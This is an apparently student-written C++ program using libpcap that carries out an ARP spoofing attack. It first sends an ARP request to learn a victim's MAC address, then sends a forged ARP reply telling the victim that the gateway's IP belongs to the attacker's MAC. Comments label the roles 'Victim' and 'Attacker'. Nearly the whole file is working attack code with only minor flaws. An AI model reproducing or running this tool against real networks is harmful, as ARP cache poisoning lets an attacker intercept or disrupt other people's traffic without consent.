#include <bits/stdc++.h>
#include <pcap.h>
#include <arpa/inet.h>
#include <sys/socket.h>
#include <sys/types.h>
#include <net/if.h>
#include <sys/ioctl.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

using namespace std;

#define arpheader   0x0001
#define arp_req     0x0001
#define arp_ply     0x0002

typedef struct eth_header
{
    u_char eth_dmac[6];
    u_char eth_smac[6];
    u_short eth_type;
}eth_Header;

typedef struct arp_header
{
    u_short arp_hrd;
    u_short arp_proto;
    u_char arp_hl;
    u_char arp_pln;
    u_short arp_op;
    u_char arp_smac[6];
    u_char arp_sip[4];
    u_char arp_dmac[6];
    u_char arp_dip[4];
}arp_Header;

ifreq *get_host_mac(char *nic_name){
  // fd - use for communication to get mac address
  int fd;
  struct ifreq *sIfReq;
  sIfReq = (ifreq*)malloc(sizeof(ifreq));
  memset(sIfReq, 0x00, sizeof(ifreq));
  // set the ifreq.ifr_name : the name of nic you use for communication
  strncpy(sIfReq->ifr_name,nic_name,strlen(nic_name));
  fd=socket(AF_UNIX, SOCK_DGRAM, 0);
  if(fd == -1){
    printf("socket() error\n");
    return NULL;
  }

  printf("=== debug == : before ioctl()\n");
  if(ioctl(fd,SIOCGIFHWADDR,sIfReq)<0){
    perror("ioctl() error\n");
    return NULL;
  }
  printf("=== debug == : after ioctl()\n");
  return sIfReq;

}

int main(int argc, char **argv)
{
    arp_Header arphd;
    eth_Header ethhd;
    char* dev = argv[1];
    char errbuf[PCAP_ERRBUF_SIZE];
    u_char packet[42];
    pcap_t* handle = pcap_open_live(dev, BUFSIZ, 1, 1000, errbuf);

    if (handle == NULL) {
      fprintf(stderr, "couldn't open device %s: %s\n", dev, errbuf);
      return -1;
    }

    if(argc != 4)
    {
        printf("arg error");
        return 0;
    }

    ifreq *ifr;
    ifr = get_host_mac("enp0s3"); // my mac address

    u_char ips[4];
    for(int i=0; i<4; i++)
        ips[i] = inet_addr(argv[2]) >> (8 * i) & 0xff;
    u_char ipd[4];
    for(int i=0; i<4; i++)
        ipd[i] = inet_addr(argv[3]) >> (8 * i) & 0xff;


 //   u_char esr[6] = {0x08, 0x00, 0x27, 0xa4, 0x22, 0x67}; //my mac ->
    u_char ipm[4] = {0xc0, 0xa8, 0x2b, 0xff};   //my ip

    //ARP Request
    memset(ethhd.eth_dmac, 0xff, 6);
    memcpy(ethhd.eth_smac, ifr->ifr_hwaddr.sa_data, 6); //my mac
    ethhd.eth_type = htons(0x0806);
    arphd.arp_hrd = htons(0x01);
    arphd.arp_proto = htons(0x0800);
    arphd.arp_hl = 6;
    arphd.arp_pln = 4;
    arphd.arp_op = htons(1);
    memcpy(arphd.arp_smac, ifr->ifr_hwaddr.sa_data, 6);
    memcpy(arphd.arp_sip, ipm, 4);

    memset(arphd.arp_dmac, 0x00, 6);
    memcpy(arphd.arp_dip, ips, 4);

    memset(packet, 0 ,sizeof(packet));
    memcpy(packet, &ethhd, sizeof(ethhd));
    memcpy(packet + sizeof(ethhd), &arphd, sizeof(arphd));
    for(int i=0; i<sizeof(ethhd); i++) printf(" %x", packet[i]);
    printf("\n");
    if(pcap_sendpacket(handle, packet, sizeof(packet)) != 0)
    {
        printf("send error");
        return 0;
    }
    printf("Wow!!");

    //arp reply
    while(1)
    {
        struct pcap_pkthdr* header;
        const u_char* pacre;
        u_char smac[6];
        pcap_next_ex(handle, &header, &pacre);
        printf("%u bytes captured\n", header->caplen);
        if(pacre[12] == 0x08 && pacre[13] == 0x06)
        {
            printf("ARP packet\n");
            if(pacre[20] == 0x00 && pacre[21] == 0x02)
            {
                printf("ARP Reply packet");
                smac[0] = pacre[22];
                smac[1] = pacre[23];
                smac[2] = pacre[24];
                smac[3] = pacre[25];
                smac[4] = pacre[26];
                smac[5] = pacre[27];
                break;
            }
        }
    }
    //index 22



    //arp attack
//    u_char gmac[6] = {0x52, 0x54, 0x00, 0x12, 0x35, 0x02}; //gateway mac 52:54:00:12:35:02
    memcpy(ethhd.eth_dmac, smac, 6); //Victim MAC Address
    memcpy(ethhd.eth_smac, ifr->ifr_hwaddr.sa_data, 6);  //Attacker MAC Address
    ethhd.eth_type = htons(0x0806); //
    arphd.arp_hrd = htons(0x01);    //Hardware Type (Ethernet : 1)
    arphd.arp_proto = htons(0x0800);    //Protocol Type (IPv4 : 0x0800)
    arphd.arp_hl = 6;   //Hardware Address Length
    arphd.arp_pln = 4;  //Protocol Address Length
    arphd.arp_op = htons(2);    //Operation (ARP reply : 2)
    memcpy(arphd.arp_smac, ifr->ifr_hwaddr.sa_data, 6); //Gateway MAC Address -> Attacker MAC Address
    memcpy(arphd.arp_sip, ipd, 4);  //Gateway IP Address

    memcpy(arphd.arp_dmac, smac, 6);    //Victim MAC Address
    memcpy(arphd.arp_dip, ips, 4);      //Victim IP Address

    memset(packet, 0 ,sizeof(packet));
    memcpy(packet, &ethhd, sizeof(ethhd));
    memcpy(packet + sizeof(ethhd), &arphd, sizeof(arphd));
    for(int i=0; i<sizeof(ethhd); i++) printf(" %x", packet[i]);
    printf("\n");
    if(pcap_sendpacket(handle, packet, sizeof(packet)) != 0)
    {
        printf("send error");
        return 0;
    }
    printf("Wow!!");

    return 0;
}
